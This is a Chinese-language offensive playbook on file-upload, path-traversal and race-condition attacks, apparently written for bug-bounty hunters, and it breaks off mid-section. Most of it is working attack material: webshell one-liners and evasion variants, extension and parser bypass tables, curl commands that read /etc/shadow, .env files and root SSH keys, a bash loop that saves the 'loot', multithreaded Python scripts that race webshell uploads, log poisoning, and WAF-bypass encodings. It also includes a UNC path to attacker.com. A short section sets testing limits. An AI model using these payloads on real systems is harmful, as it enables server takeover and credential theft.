# 文件上传 (任意文件写入 / Webshell)

> 视角：黑盒，目标是上传可解析的文件 / 触发解析漏洞 / 拿 shell

## 1. 一句话说清

文件上传 = 把不可信的字节存到服务器 + 后端能解析它。
两层都得突破：(a) **绕过校验**，(b) **触发解析**。
SRC 价值：成功 = 直接 RCE，P0；失败 = 受限上传，P2/P3。

---

## 2. 高频入口点

### 2.1 上传点分布（前 50 案例统计）

| 类型 | 占比 | 路径特征 |
|------|------|---------|
| 富文本编辑器 | 42% | `/fckeditor/`、`/ewebeditor/`、`/ueditor/`、`/kindeditor/` |
| 头像 | 18% | `/upload/avatar/`、`/member/uploadfile/` |
| 附件 / 文档 | 15% | `/uploads/`、`/attachment/` |
| 后台功能 | 12% | `/admin/upload/`、`/system/upload/` |
| 业务 | 8% | `/apply/`、`/submit/`、`/import/` |
| 导入 | 5% | `/import/`、`/excelUpload/` |

### 2.2 编辑器路径速查

| 编辑器 | 测试路径 |
|--------|---------|
| FCKeditor | `/FCKeditor/editor/filemanager/browser/default/connectors/test.html` |
| FCKeditor | `/FCKeditor/editor/filemanager/browser/default/browser.html` |
| FCKeditor | `/FCKeditor/editor/filemanager/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=/` |
| eWebEditor | `/ewebeditor/admin/default.jsp` |
| eWebEditor | `/eWebEditor/admin/Login.aspx` |
| UEditor | `/ueditor/controller.jsp?action=config` |
| UEditor | `/ueditor/php/controller.php?action=config` |
| KindEditor | `/kindeditor/php/file_manager_json.php` |
| CKEditor | `/ckfinder/userfiles/files/` |
| TinyMCE | `/plugins/imagemanager/upload.php` |

### 2.3 高危 CMS 路径

| CMS / 系统 | 上传路径 | 条件 |
|-----------|---------|------|
| 万户 OA ezOffice | `/defaultroot/dragpage/upload.jsp` | 截断绕过 |
| 用友协作 | `/oaerp/ui/sync/excelUpload.jsp` | 绕过 JS |
| 金蝶 GSiS | `/kdgs/core/upload/upload.jsp` | 注册用户 |
| Finecms | `/member/controllers/Account.php` | 注册用户 + 竞态 |
| PHPEMS | `/app/document/api.php` | 无后缀检测 |

---

## 3. 探测手法

### 3.1 客户端 JS 校验绕过

```
1. 禁用浏览器 JS / 用 Postman / curl 直接发包
2. Burp 拦截上传请求，改 filename / content-type
3. 改前端 DOM：把 accept="image/*" 删掉
```

### 3.2 扩展名绕过快表

| 技巧 | PHP | ASP/X | JSP |
|------|-----|-------|-----|
| 大小写 | `.Php`、`.pHp` | `.Asp`、`.aSp` | `.Jsp` |
| 双写 | `.pphphp` | `.asaspp` | `.jsjspp` |
| 特殊后缀 | `.php3`、`.php5`、`.phtml`、`.phar`、`.pht` | `.asa`、`.cer`、`.cdx`、`.aspx` | `.jspx`、`.jspa`、`.jspi`、`.jsw` |
| 空格 / 点 | `.php ` 或 `.php.` | `.asp ` | `.jsp.` |
| `::$DATA` | - | `.asp::$DATA` | - |
| `%00` 截断 | `.php%00.jpg` | `.asp%00.jpg` | `.jsp%00.jpg` |
| `;` 截断 | - | `.asp;.jpg`（IIS6） | - |
| `/` 截断 | - | `.asp/.jpg` | - |

### 3.3 Content-Type 修改

```
原始: application/octet-stream
改成: image/jpeg / image/png / image/gif / application/pdf
```

抓包改 `multipart/form-data` 中的 `Content-Type:` 行。

### 3.4 文件头 / 内容绕过

```bash
# 图片马（GIF）
echo -ne "GIF89a\n<?php @eval(\$_POST['c']);?>" > shell.gif
mv shell.gif shell.php

# 图片马（PNG，二进制头 + 注释段藏 PHP）
copy /b real.png + shell.php fake.png   # Windows
cat real.jpg shell.php > fake.jpg        # Linux

# EXIF 注入（GIMP 编辑 EXIF Comment）
exiftool -Comment="<?php system(\$_GET['cmd']);?>" image.jpg
```

### 3.5 Webshell 内容免杀

| 类型 | 示例 |
|------|------|
| **PHP 变量函数** | `<?php $a='ass'.'ert'; $a($_POST['c']);?>` |
| **PHP 回调** | `<?php array_map('assert', $_POST);?>` |
| **PHP 动态构造** | `<?php $f = create_function('', $_POST['x']); $f();?>` |
| **PHP eval 替代** | `preg_replace('/.*/e', $_POST['c'], '');`（PHP < 7） |
| **JSP** | `<%Runtime.getRuntime().exec(request.getParameter("c"));%>` |
| **JSPX** | XML 格式，WAF 检测 `.jsp` 时漏掉 |
| **ASP** | `<%execute(request("c"))%>` |
| **ASPX** | `<%@ Page Language="C#"%><%System.Diagnostics.Process.Start(...)%>` |

### 3.6 解析漏洞触发

| 服务器 | 漏洞 | Payload |
|--------|------|---------|
| **IIS 6.0 目录** | `/shell.asp/1.jpg` → 当 ASP | 上传到 `/shell.asp/` 文件夹 |
| **IIS 6.0 文件** | `shell.asp;.jpg` → 当 ASP | 直接命名 |
| **IIS 7.x** | `shell.jpg/.php` → 当 PHP（fix_pathinfo=1） | URL 拼接 |
| **Apache 多后缀** | `shell.php.xxx` → 当 PHP（从右向左找） | 命名为 `shell.php.xxx` |
| **Apache .htaccess** | `AddType application/x-httpd-php .jpg` | 上传 .htaccess 后再传 .jpg |
| **Apache CVE-2017-15715** | `shell.php\x0a` → 当 PHP | 文件名末加 `\n` |
| **Nginx fix_pathinfo** | `shell.jpg/x.php` → 当 PHP | URL 路径拼接 |
| **Nginx CVE-2013-4547** | `shell.jpg \0.php` | 空字节 |
| **Tomcat CVE-2017-12615** | PUT `/shell.jsp/` | PUT 方法 |

### 3.7 路径获取 / 命名规则

| 方式 | 描述 |
|------|------|
| 响应直接返回 | `{"url":"/uploads/2024/abc.jpg"}` |
| 预览功能 | 上传后页面显示 / 编辑器预览 |
| 编辑器目录遍历 | `?Command=GetFoldersAndFiles&CurrentFolder=/../` |
| 时间戳爆破 | `20140829221136jsp.jsp`，秒级偏差 ±60s |
| 配合 .git 泄露 | 反推命名规则代码 |

---

## 4. Bypass 矩阵

| 防护 | 绕过 |
|------|------|
| 客户端 JS | 禁 JS / 抓包改包 |
| 黑名单后缀 | 大小写、双写、特殊后缀 |
| 白名单 | `%00`（旧）、解析漏洞、`.jsp/x.jsp.png` |
| Content-Type | 改 `image/jpeg` |
| 文件头 | `GIF89a` 头 + 脚本 |
| 内容静态扫描 | 变量函数 / 编码 / 拼接 |
| 大小限制 | Chunked / 分片上传 |
| 二次渲染 | EXIF / IDAT / GIF 注释段 / PNG tEXt |
| 上传后路径不返回 | 编辑器遍历 / 时间戳爆破 / 配合源码泄露 |
| 删除时间窗 | 竞态：多线程上传 + 立即访问（Finecms 漏洞） |
| 非脚本目录 | `filename=../../webroot/shell.php` 路径穿越 |

---

## 5. 利用提权 / 横向

```
上传 webshell.jsp / shell.php
  → 访问 /uploads/shell.php?c=id
  → 反弹 shell（SRC 不要做）
  → 提权（不要做）
  → 横向（不要做）

→ SRC 报告时停在"shell.php?c=id 返回 uid=..."
  写入文件命名为 poc-{date}-{nick}.jsp，立即在报告里说明"已请清理"
```

---

## 6. 真实案例指纹

| 案例 ID | 关键技术 | 目标 |
|--------|---------|------|
| wooyun-2015-0108457 | HTTP Response 修改绕过 | 交通系统 |
| wooyun-2015-0135258 | FCKeditor 编辑器漏洞 | 公共交通 |
| wooyun-2016-0167456 | `%00` 截断 | 金融系统 |
| wooyun-2014-064031 | 万户 OA 截断绕过 | 万户 ezOffice |
| wooyun-2015-090186 | eWebEditor | 政府采购 |
| wooyun-2014-063369 | Finecms 竞争条件 | Finecms |
| wooyun-2015-0126541 | 万户 ezOffice 架构分析 | 万户 |
| wooyun-2015-0149146 | JSPX 绕过 | 保险系统 |
| wooyun-2015-0158311 | Nginx 解析漏洞 | 门户网站 |
| wooyun-2016-0212792 | 扩展名绕过 | 运营商 |

通用指纹：

- 上传响应含 `path`、`url`、`filename` 字段 → 路径已知
- 站点 `/uploads/`、`/upload/`、`/files/` 直接可访问目录列表 → 浏览
- IIS 6.0 + `.asp;.jpg` → 经典解析漏洞
- Apache + 上传 .htaccess 不被禁 → 改解析规则
- Nginx + URL `x.jpg/y.php` 返回 200 → fix_pathinfo

---

## 7. 复现 / 证据要点

### 7.1 报告必备

1. **上传请求包**（含完整 multipart）
2. **上传响应**（含返回的文件 URL，如有）
3. **访问 webshell 的请求 + 响应**（证明可执行）
4. **执行命令的输出**（`id`，脱敏内网信息）
5. **修复后请清理 PoC 文件**的提示

### 7.2 报告 PoC 模板

```http
POST /upload.jsp HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=xxx

--xxx
Content-Disposition: form-data; name="file"; filename="poc-2025-05-09.jsp"
Content-Type: image/jpeg

<%out.println(Runtime.getRuntime().exec("id").getInputStream());%>
--xxx--

# 响应
{"url":"/uploads/20250509142312poc-2025-05-09.jsp"}

# 验证
GET /uploads/20250509142312poc-2025-05-09.jsp
→ uid=1001(tomcat) gid=1001(tomcat)
```

### 7.3 CVSS

```
未授权任意文件上传 → RCE  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8
认证后任意文件上传 → RCE  CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 8.8
受限上传（仅前缀绕过） CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N = 6.5
```

### 7.4 影响段

```
通过 /upload.jsp 接口，攻击者可绕过扩展名校验上传 .jsp 文件，
配合 Tomcat 默认解析行为获得 RCE。攻击者可：
1. 读取 web 应用源码、数据库连接配置；
2. 横向至内网（应用服务器通常可访问 DB / Redis）；
3. 在不修复情况下持久化驻留。

测试时上传文件名 poc-2025-05-09.jsp，命令仅执行 id，
请贵方在确认漏洞后删除 /uploads/20250509142312poc-2025-05-09.jsp。
```

---

## 相关 MCP 工具

实战中可调用 jshookmcp 完成自动化。**默认 `search` profile 未预加载工具,调用前先用 `mcp__jshook__activate_tools <工具名>` 激活**(详见 [`../tools/mcp-jshook.md`](../tools/mcp-jshook.md) §推荐 profile)。

| 工具 | 域 | 调用时机 |
|---|---|---|
| `mcp__jshook__binary_encode` + `mcp__jshook__binary_decode` | encoding | 构造 polyglot(图片头+脚本尾)/ base64 / hex 转换 |
| `mcp__jshook__ast_transform_apply` + `mcp__jshook__ast_transform_preview` | transform | 修改 magic byte / 改 polyglot 结构 / 改 MIME 嵌入语义 |
| `mcp__jshook__http_plain_request` | network | 自定义 multipart 边界 / 改 Content-Disposition 头绕过过滤 |
| `mcp__jshook__network_replay_request` | network | 重放上传请求并改 filename / Content-Type |
| `mcp__jshook__protobuf_decode_raw` | encoding | 上传响应是 protobuf 时盲解元数据 |

完整映射:[`../tools/mcp-jshook.md`](../tools/mcp-jshook.md)

## 8. 不要做的事

- **禁**：上传真正的 webshell（带后门、加密通道）。**只用最简单的 jsp/php**：`<%=Runtime.getRuntime().exec("id").getInputStream()%>`。
- **禁**：上传后做提权、横向、植入持久化。
- **禁**：上传可被他人误访问的内容（钓鱼页、外链脚本）。
- **禁**：留下 webshell 不清理。报告里**主动**告知文件路径并请求删除。
- **禁**：测试覆盖现有合法文件（如 `index.jsp`）——可能影响业务。
- **限**：测试上传 1–3 个 PoC 文件即停，不批量上传。
- **报告中**：写明"PoC 文件名为 X，请贵方修复后删除"。

## H1 真实案例

_共 8 份 HackerOne 已披露 High/Critical 报告命中本类，按 (赏金 + 投票×100) 排序取 Top 12_

| Severity | $ | 程序 | 标题（点击看原报告） | 摘要 |
|---|--:|---|---|---|
| High | 1500 usd | Slack | [Tricking the "Create snippet" feature into displaying the wrong filetype can lead to RCE on Slack…](https://hackerone.com/reports/833080) | Tricking the "Create snippet" feature into displaying the wrong filetype can lead to RCE on Slack users |
| Critical | 5000 usd | Aiven Ltd | [[Kafka Connect] [JdbcSinkConnector][HttpSinkConnector] RCE by leveraging file upload via SQLite J…](https://hackerone.com/reports/1547877) | Summary: The Aiven JDBC sink includes the SQLite JDBC Driver. This JDBC driver can be used to upload SQLite database files onto… |
| Critical | — | Mars | [Unrestricted File Upload at ██████████](https://hackerone.com/reports/2357778) | Unrestricted File Upload at ██████████ |
| High | 4660 usd | Internet Bug Bounty | [Cargo not respecting umask when extracting crate archives](https://hackerone.com/reports/2094785) | Cargo did not properly protect files in the cargo registry. When an archive contained files which were marked as globally write… |
| High | — | U.S. Dept Of Defense | [Unrestricted File Upload Leads to XSS & Potential RCE](https://hackerone.com/reports/900179) | Summary:** Unrestricted file upload at████████/request?openform. When the user wants to upload a file the app allows the user t… |
| High | — | WordPress | [[Buddypress] Arbitrary File Deletion through bp_avatar_set](https://hackerone.com/reports/183568) | Hi, The bp_avatar_set action in BuddyPress when cropping avatars allows an attacker to arbitrarily delete a file the webserver … |
| High | — | Node.js third-party modules | [Arbitrary File Write Through Archive Extraction](https://hackerone.com/reports/362118) | I would like to report arbitrary file write vulnerability in adm-zip module It allows attackers to write arbitrary files when a… |
| High | — | U.S. Dept Of Defense | [Stored XSS on ████████helpdesk](https://hackerone.com/reports/901799) | Stored XSS on ████████helpdesk |

**命中本类的 weakness 分布：**

- Unrestricted Upload of File with Dangerous Type：5 条
- Uncategorized → 手工归类：3 条


## Payload 库

_7 个结构化 web payload，含完整攻击链 + WAF/EDR 绕过变体_

### 文件上传绕过  `file-upload-bypass`
文件上传限制绕过技术
子类：**文件上传** · tags: `upload` `bypass` `webshell`

**前置条件：** 目标存在文件上传功能；存在上传限制

**攻击链：**

**1. 扩展名绕过**
_扩展名绕过(含大小写、双后缀)_
```
shell.php.jpg
shell.php%00.jpg
shell.phtml
shell.php5
shell.phar
shell.PhP
```

**2. Content-Type**
_修改Content-Type_
```
Content-Type: image/jpeg
Content-Type: image/png
```

**3. 图片马**  _[windows]_
_图片马制作_
```
copy normal.jpg/b + shell.php/a webshell.jpg
```

**4. 空格绕过**  _[windows]_
_文件名末尾空格_
```
# 空格/空字符绕过后缀检测:
# 1. 文件名末尾加空格(Windows特性，保存时自动去除):
filename="shell.php "

# 2. %20编码空格:
Content-Disposition: form-data; name="file"; filename="shell.php%20"

# 3. 空字节截断(PHP<5.3.4):
filename="shell.php%00.jpg"
filename="shell.php\x00.jpg"

# 4. 制表符注入:
filename="shell.php%09.jpg"

# Burp中操作: 拦截上传请求 → 在filename中的.php后手动添加空格/空字节
```

**5. 点号绕过**  _[windows]_
_文件名末尾点号_
```
# 点号/特殊字符绕过:
# 1. 末尾加点(Windows会自动去除末尾的点):
filename="shell.php."
filename="shell.php..."

# 2. 点+空格组合:
filename="shell.php. "
filename="shell.php .jpg"

# 3. 分号截断(IIS 6.0):
filename="shell.asp;.jpg"
filename="test.asp;x.jpg"

# 4. ::概念(不执行，仅说明)
# Windows NTFS流: shell.php::DATA_STREAM

# 5. 换行符注入:
filename="shell.ph
p"

# 测试: 上传后访问URL，确认文件是否被当作PHP解析
curl "http://target.com/uploads/shell.php." -v
```

**6. NTFS流**  _[windows]_
_NTFS ADS绕过_
```
# Windows NTFS备用数据流绕过:
# 1. 标准NTFS ADS绕过:
filename="shell.php::DATA"
# Windows会自动忽略::DATA后缀，文件保存为shell.php

# 2. 其他ADS变体:
filename="shell.php::INDEX_ALLOCATION"
filename="shell.php:evil.php"
filename="shell.php:evil.txt:DATA"

# 3. 在Burp中操作:
# 拦截上传请求
# 修改filename为: shell.php::DATA
# 发送请求

# 4. 验证文件是否上传:
curl "http://target.com/uploads/shell.php" -v
curl "http://target.com/uploads/shell.php::DATA" -v

# 注意: 仅在Windows(IIS/NTFS)环境有效，Linux无此特性
```

**7. 双写绕过**
_双写扩展名_
```
# 双写后缀绕过(当服务器仅删除一次敏感后缀时):
# 1. PHP双写:
filename="shell.pphphp"    # 删除php后剩余shell.php
filename="shell.pHPhp"     # 大小写混合双写
filename="shell.phphpp"    # 不同位置双写

# 2. ASP双写:
filename="shell.asaspp"    # 删除asp后剩余shell.asp
filename="shell.aaspsp"

# 3. JSP双写:
filename="shell.jjspsp"

# 4. 多层嵌套:
filename="shell.phpphpphp" # 两次删除后仍为.php

# 5. 结合大小写:
filename="shell.PhPhPp"

# 验证: 上传后确认服务器保存的实际文件名
curl -I "http://target.com/uploads/shell.php"
```

**WAF/EDR 绕过变体：**

**1. 双扩展名与NTFS数据流绕过**
_利用双扩展名欺骗文件类型检测，Windows NTFS备用数据流(::$DATA)绕过扩展名检查，特殊字符(空格、点号、空字节)截断文件名_
```
# 双扩展名:
shell.php.jpg
shell.jpg.php
shell.php.test
shell.php%00.jpg

# NTFS备用数据流(Windows):
shell.php::$DATA
shell.php::$DATA.jpg
shell.asp;.jpg

# 特殊字符:
shell.php%20
shell.php.
shell.php....
shell.php\x00.jpg
```

**2. Content-Disposition操纵与分块上传**
_通过Content-Disposition头的filename编码变体、分块传输编码(Chunked)绕过WAF流检测，利用PHP包装器协议访问压缩包内的恶意文件_
```
# Content-Disposition字段名包裹绕过:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Disposition: form-data; name="file"; filename*=UTF-8''shell.php
Content-Disposition: form-data; name="file"; filename="shell.php"

# 分块传输编码:
Transfer-Encoding: chunked

# PHP Wrapper上传:
zip://uploads/avatar.jpg%23shell
phar://uploads/avatar.jpg/shell.php

# 竞态条件:
# 上传后立即在文件被删除前访问
```

---

### 任意文件下载  `file-download`
利用文件下载功能中的路径控制缺陷下载服务器上的任意敏感文件
子类：**下载** · tags: `file-download` `lfi` `leak`

**前置条件：** 目标存在文件下载功能；文件路径参数可控；服务端未对路径进行严格过滤

**攻击链：**

**1. 识别文件下载接口**
_识别目标的文件下载接口和参数名_
```
# 常见文件下载URL模式:
curl -v "http://target.com/download?file=report.pdf"
curl -v "http://target.com/download.php?path=uploads/doc.pdf"
curl -v "http://target.com/api/file/read?name=image.jpg"
curl -v "http://target.com/export?filename=data.csv"
curl -v "http://target.com/attachment/get/123"
```

**2. 路径遍历下载敏感文件**
_利用路径遍历序列读取Web根目录以外的敏感系统和应用配置文件_
```
# Linux敏感文件:
curl "http://target.com/download?file=../../../etc/passwd"
curl "http://target.com/download?file=....//....//....//etc/shadow"
curl "http://target.com/download?file=%2e%2e/%2e%2e/%2e%2e/etc/passwd"
curl "http://target.com/download?file=..%252f..%252f..%252fetc/passwd"

# Windows敏感文件:
curl "http://target.com/download?file=......windowswin.ini"
curl "http://target.com/download?file=......windowssystem32configSAM"

# Web应用配置文件:
curl "http://target.com/download?file=../WEB-INF/web.xml"
curl "http://target.com/download?file=../application.properties"
curl "http://target.com/download?file=../.env"
curl "http://target.com/download?file=../config/database.yml"
```

**3. 下载源码与数据库配置**  _[linux]_
_针对性下载应用源码和数据库配置文件获取数据库凭证_
```
# Java应用关键文件:
curl "http://target.com/download?file=../../WEB-INF/web.xml" -o web.xml
curl "http://target.com/download?file=../../WEB-INF/classes/application.yml" -o app.yml
curl "http://target.com/download?file=../../WEB-INF/classes/db.properties" -o db.properties

# PHP应用:
curl "http://target.com/download?file=../../config.php" -o config.php
curl "http://target.com/download?file=../../.env" -o .env

# Node.js应用:
curl "http://target.com/download?file=../../package.json" -o package.json
curl "http://target.com/download?file=../../.env" -o .env

# 提取数据库凭证:
grep -iE "password|passwd|pwd|secret|key|db_|database|mysql|postgres" *.yml *.xml *.properties *.env 2>/dev/null
```

**4. 自动化批量敏感文件探测**  _[linux]_
_自动化探测和下载多个常见敏感文件_
```
#!/bin/bash
# 批量测试常见敏感文件路径
BASE="http://target.com/download?file="
FILES=(
  "../../../etc/passwd" "../../../etc/shadow" "../../../etc/hosts"
  "../../../proc/self/environ" "../../../proc/self/cmdline"
  "../../WEB-INF/web.xml" "../../WEB-INF/classes/application.properties"
  "../../.env" "../../config.php" "../../web.config"
  "../../../root/.ssh/id_rsa" "../../../root/.bash_history"
  "../../../var/log/apache2/access.log"
)

for f in "${FILES[@]}"; do
  resp=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" "${BASE}${f}")
  code=$(echo $resp | cut -d: -f1)
  size=$(echo $resp | cut -d: -f2)
  if [ "$code" == "200" ] && [ "$size" -gt 0 ]; then
    echo "[+] FOUND: $f (HTTP $code, $size bytes)"
    curl -s "${BASE}${f}" -o "loot_$(echo $f | tr '/' '_')"
  fi
done
```

**WAF/EDR 绕过变体：**

**1. 双重URL编码绕过**
_利用双重URL编码、Unicode超长编码等绕过WAF对路径遍历字符的检测_
```
# 双重编码../
?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd
?file=%252e%252e%255cetc%255cpasswd

# Unicode编码变体
?file=..%c0%af..%c0%afetc/passwd
?file=..%ef%bc%8f..%ef%bc%8fetc/passwd

# 混合编码
?file=..%2f..%2f..%2fetc%2fpasswd
?file=....//....//etc/passwd
```

**2. 参数名替换与路径操控**
_尝试不同的文件参数名和URL协议wrapper绕过WAF规则_
```
# 常见文件下载参数名Fuzz
?path=../../etc/passwd
?filepath=../../etc/passwd
?filename=../../etc/passwd
?doc=../../etc/passwd
?download=../../etc/passwd
?src=../../etc/passwd
?url=file:///etc/passwd

# 利用URL协议
?file=file:///etc/passwd
?file=php://filter/convert.base64-encode/resource=config.php
```

**3. 空字节截断与后缀绕过**
_利用空字节截断、路径长度限制和特殊字符混淆绕过文件路径检查_
```
# 空字节截断（PHP < 5.3.4）
?file=../../etc/passwd%00
?file=../../etc/passwd%00.jpg

# 路径截断（Windows长路径）
?file=../../etc/passwd..............................................................

# 点斜杠混淆
?file=....//....//....//etc/passwd
?file=..;/..;/..;/etc/passwd
?file=..\..\..\etc\passwd
```

---

### 条件竞争  `file-competition`
利用文件上传/处理过程中的竞态条件(Race Condition)，在安全检查与文件使用之间的时间窗口内执行恶意操作
子类：**Race Condition** · tags: `race-condition` `file-upload`

**前置条件：** 目标存在文件上传功能；服务端先上传后检查的处理流程；可以高并发访问上传的文件；了解临时文件存储路径

**攻击链：**

**1. 识别竞态条件窗口**  _[linux]_
_分析文件上传的处理流程，识别安全检查前后的时间窗口_
```
# 分析上传流程:
# 1. 文件上传到临时目录
# 2. 后端进行安全检查(文件类型/内容)
# 3. 如果检查通过则保留，否则删除
# 在步骤1和步骤3之间存在时间窗口

# 测试上传响应时间(判断是否有检查延迟)
for i in $(seq 1 5); do
  time curl -s -o /dev/null -w "%{http_code}" -F "file=@test.jpg" "http://target.com/upload"
done
```

**2. 竞态条件利用 - 上传与访问并发**  _[linux]_
_在上传后安全检查删除之前的时间窗口内访问执行恶意文件_
```
# 恶意PHP文件 (shell.php):
# <?php system($_GET["cmd"]); ?>

# 方法1: 使用两个终端并发操作
# 终端1 - 持续上传:
while true; do
  curl -s -F "file=@shell.php" "http://target.com/upload" &
done

# 终端2 - 持续访问:
while true; do
  result=$(curl -s "http://target.com/uploads/shell.php?cmd=id")
  if echo "$result" | grep -q "uid="; then
    echo "[+] RCE SUCCESS: $result"
    break
  fi
done
```

**3. Python并发竞态利用脚本**
_多线程并发上传与访问，提高竞态条件利用成功率_
```
import requests
import threading
import time

TARGET = "http://target.com"
UPLOAD_URL = f"{TARGET}/upload"
SHELL_URL = f"{TARGET}/uploads/shell.php?cmd=id"

def upload_loop():
    files = {"file": ("shell.php", "<?php system($_GET['cmd']); ?>", "image/jpeg")}
    while not stop_event.is_set():
        try:
            requests.post(UPLOAD_URL, files=files, timeout=2)
        except: pass

def access_loop():
    while not stop_event.is_set():
        try:
            r = requests.get(SHELL_URL, timeout=1)
            if "uid=" in r.text:
                print(f"[+] RCE! Response: {r.text[:200]}")
                stop_event.set()
                return
        except: pass

stop_event = threading.Event()
threads = []
for _ in range(10):
    threads.append(threading.Thread(target=upload_loop))
for _ in range(20):
    threads.append(threading.Thread(target=access_loop))
for t in threads: t.start()
time.sleep(60)
stop_event.set()
for t in threads: t.join()
```

**4. .htaccess竞态写入**  _[linux]_
_利用.htaccess的竞态上传使Apache将图片文件按PHP解析执行_
```
# 如果可以上传.htaccess文件(即使会被删除):
# .htaccess内容:
AddType application/x-httpd-php .jpg

# 竞态利用:
# 1. 先正常上传一个含PHP代码的.jpg文件
curl -F "file=@shell.jpg" "http://target.com/upload"

# 2. 在.htaccess存在的时间窗口内访问.jpg
while true; do
  curl -s -F "file=@.htaccess" "http://target.com/upload" &
  result=$(curl -s "http://target.com/uploads/shell.jpg?cmd=id")
  [ -n "$result" ] && echo "[+] $result" && break
done
```

**WAF/EDR 绕过变体：**

**1. 并发上传竞态利用**
_通过大量并发请求在文件检查与删除之间的时间窗口访问已上传的文件_
```
# Python并发竞态上传
import threading, requests

def upload_shell():
    files = {'file': ('test.php', '<?php echo "security_check"; ?>', 'image/jpeg')}
    requests.post('http://target/upload', files=files)

def access_shell():
    r = requests.get('http://target/uploads/test.php')
    if 'security_check' in r.text:
        print('[+] Race won!')

for i in range(100):
    t1 = threading.Thread(target=upload_shell)
    t2 = threading.Thread(target=access_shell)
    t1.start(); t2.start()
```

**2. .htaccess竞态覆盖**
_利用竞态条件在检查间隙写入.htaccess使图片文件被解析为PHP_
```
# 竞态条件上传.htaccess
import threading, requests

def upload_htaccess():
    files = {'file': ('.htaccess', 'AddType application/x-httpd-php .jpg', 'text/plain')}
    requests.post('http://target/upload', files=files)

def upload_payload():
    files = {'file': ('test.jpg', '<?php echo "security_check"; ?>', 'image/jpeg')}
    requests.post('http://target/upload', files=files)

for i in range(50):
    t1 = threading.Thread(target=upload_htaccess)
    t2 = threading.Thread(target=upload_payload)
    t1.start(); t2.start()
```

**3. 分块上传时间窗口**
_通过分块传输编码（chunked）延长服务器处理时间，增大竞态利用窗口_
```
# 利用分块传输延长上传时间窗口
import socket, time

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('target', 80))

headers = (
    "POST /upload HTTP/1.1\r\n"
    "Host: target\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Content-Type: multipart/form-data; boundary=abc\r\n\r\n"
)
sock.send(headers.encode())

# 缓慢发送分块数据，延长文件存在时间
chunks = ["5\r\nhello\r\n", "5\r\nworld\r\n", "0\r\n\r\n"]
for chunk in chunks:
    sock.send(chunk.encode())
    time.sleep(0.5)
```

---

### 路径遍历  `file-traversal`
利用路径遍历(../)序列突破文件访问的目录限制，读取或写入Web根目录以外的任意文件
子类：**Traversal** · tags: `traversal` `file`

**前置条件：** 目标存在文件读取/包含功能；文件路径参数可控；服务端路径过滤不严格

**攻击链：**

**1. 基础路径遍历测试**  _[linux]_
_测试基本路径遍历和所需的目录跳转深度_
```
# 基础遍历:
curl "http://target.com/file?path=../../../../etc/passwd"
curl "http://target.com/image?name=../../../../etc/passwd"

# 测试遍历深度(通常3-10层足够到根目录):
for i in $(seq 1 10); do
  traversal=$(printf "../%.0s" $(seq 1 $i))
  resp=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" "http://target.com/file?path=${traversal}etc/passwd")
  echo "Depth $i: $resp"
done
```

**2. 编码绕过路径过滤**
_使用多种编码方式绕过路径遍历的过滤机制_
```
# URL编码:
curl "http://target.com/file?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"

# 双重URL编码:
curl "http://target.com/file?path=%252e%252e%252f%252e%252e%252fetc/passwd"

# Unicode编码:
curl "http://target.com/file?path=..%c0%afetc/passwd"
curl "http://target.com/file?path=..%ef%bc%8fetc/passwd"

# 空字节截断(PHP<5.3.4):
curl "http://target.com/file?path=../../../../etc/passwd%00.jpg"

# 双写绕过(服务端删除../一次):
curl "http://target.com/file?path=....//....//....//etc/passwd"

# 反斜杠(Windows):
curl "http://target.com/file?path=......windowswin.ini"

# 混合斜杠:
curl "http://target.com/file?path=../../../../etc/passwd"
```

**3. Windows特有路径遍历**  _[windows]_
_Windows环境下的特有路径遍历手法和敏感文件_
```
# UNC路径(可能触发SMB认证):
curl "http://target.com/file?path=\attacker.comshare	est"

# Windows敏感文件:
curl "http://target.com/file?path=C:Windowswin.ini"
curl "http://target.com/file?path=C:WindowsSystem32configSAM"
curl "http://target.com/file?path=C:inetpubwwwrootweb.config"
curl "http://target.com/file?path=C:UsersAdministrator.sshid_rsa"

# IIS短文件名枚举:
curl -v "http://target.com/file?path=C:inetpubwwwrootWEB~1.CON"
```

**4. LFI到RCE升级**  _[linux]_
_将文件包含(LFI)升级为远程代码执行(RCE)_
```
# 1. 日志文件包含(Log Poisoning):
curl "http://target.com/" -A "<?php system($_GET['cmd']); ?>"
curl "http://target.com/file?path=../../../var/log/apache2/access.log&cmd=id"

# 2. /proc/self/environ包含:
curl "http://target.com/file?path=../../../proc/self/environ" -A "<?php system($_GET['c']); ?>"

# 3. PHP Session文件包含:
# 先在session中写入payload(如用户名字段)
# 然后包含session文件:
curl "http://target.com/file?path=../../../tmp/sess_SESSION_ID"

# 4. PHP Filter读取源码:
curl "http://target.com/file?path=php://filter/convert.base64-encode/resource=config.php"
```

**WAF/EDR 绕过变体：**

**1. 编码绕过路径过滤**
_通过双重URL编码、Unicode超长编码、UTF-8非标准编码绕过WAF的路径检测规则_
```
# 双重URL编码
..%252f..%252f..%252fetc%252fpasswd

# Unicode/UTF-8超长编码
..%c0%af..%c0%afetc/passwd
..%e0%80%af..%e0%80%afetc/passwd

# 16位Unicode编码
..%u002f..%u002fetc/passwd
..%u2215..%u2215etc/passwd

# URL编码混合
%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2e%2e%5c%2e%2e%5cetc%5cpasswd
```

**2. 路径规范化差异利用**
_利用不同中间件（IIS/Apache/Nginx/Tomcat）对路径解析的差异绕过安全限制_
```
# 反斜杠替代（IIS/Windows）
..\..\..\etc\passwd
..\\..\\..\\windows\\win.ini

# 点斜杠变体
....//....//....//etc/passwd
..;/..;/..;/etc/passwd
..%00/..%00/etc/passwd

# Java/Tomcat特殊处理
/..;/..;/..;/etc/passwd
/.;/../.;/../etc/passwd

# Nginx路径折叠
/static/../../../etc/passwd
/images/..%2f..%2f..%2fetc/passwd
```

**3. 空字节与路径截断绕过**
_利用空字节注入、文件系统路径长度限制和Windows特殊文件名处理机制绕过_
```
# 空字节截断
../../etc/passwd%00.png
../../etc/passwd\x00.jpg

# Windows短文件名
